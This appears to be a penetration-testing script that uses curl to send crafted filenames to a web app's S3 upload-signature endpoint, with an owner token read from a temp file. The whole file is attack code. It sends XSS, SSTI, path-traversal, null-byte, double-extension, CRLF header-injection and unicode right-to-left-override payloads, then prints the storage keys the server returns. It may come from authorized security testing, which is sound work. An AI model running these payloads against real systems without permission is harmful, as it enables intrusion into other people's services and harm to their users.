import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXF'+uuid.uuid4().hex[:5]
print("=== filename injection via s3_upload_signature ===")
names=[
 ('plain', f'zx-{tag}.pdf'),
 ('xss', f'<img src=x onerror=alert(1)>{tag}.pdf'),
 ('svg', f'<svg onload=alert(1)>{tag}.svg'),
 ('quote', f'"><svg onload=alert(1)>{tag}.pdf'),
 ('ssti', f'{{{{7*7}}}}{tag}.pdf'),
 ('path', f'../../../../etc/{tag}.pdf'),
 ('null', f'zx-{tag}.pdf\x00.html'),
 ('double-ext', f'zx-{tag}.pdf.html'),
 ('crlf', f'zx-{tag}\r\nX-Injected:1.pdf'),
 ('unicode', f'zx-{tag}\u202e.html'),
]
for label,fn in names:
    c,b=post('/api/v1/files/s3_upload_signature',
             {"file_name":fn,"model_name":None,"model_id":None,"content_hash":"x"})
    key=''
    try: key=(json.loads(b).get('formData') or {}).get('key','')
    except: key=b[:80]
    print(f"  {label:12} {c:>4}  key={str(key)[:95]}")
